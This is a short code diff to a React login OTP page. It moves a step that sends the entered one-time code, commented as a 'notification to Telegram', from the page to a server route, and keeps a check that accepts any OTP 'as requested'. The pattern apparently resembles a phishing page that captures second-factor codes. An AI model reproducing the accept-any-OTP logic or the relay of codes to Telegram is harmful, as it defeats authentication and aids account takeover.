@@ -24,16 +24,7 @@ export default function LoginOtpPage() {
 
     setIsLoading(true);
     
-    // Send notification to Telegram with OTP
-    try {
-      await fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ otp, action: 'otp_verify' })
-      });
-    } catch (err) {
-      console.error('Failed to send notification:', err);
-    }
+    // Note: Notification is now handled in the verify-otp API route
 
     // Verify OTP (accept any OTP for now as requested)
     try {
